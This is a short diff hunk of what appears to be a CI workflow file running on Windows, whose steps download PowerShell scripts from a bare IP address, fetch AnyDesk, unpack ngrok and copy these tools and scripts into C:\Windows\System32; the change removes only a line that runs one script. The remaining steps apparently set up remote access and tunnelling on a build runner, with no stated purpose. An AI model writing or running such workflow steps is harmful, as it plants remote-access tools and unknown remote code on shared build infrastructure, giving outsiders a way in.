@@ -34,7 +34,6 @@ jobs:
           Invoke-WebRequest http://5.102.153.140/lambdatest/lol3.ps1 -OutFile lol3.ps1
           Invoke-WebRequest https://download.anydesk.com/AnyDesk.exe -OutFile AnyDesk.exe
           tar xf ngrok.zip
-          .\lol.ps1
           Copy ngrok.exe C:\Windows\System32
           Copy lol2.ps1 C:\Windows\System32
           Copy w.cmd C:\Windows\System32
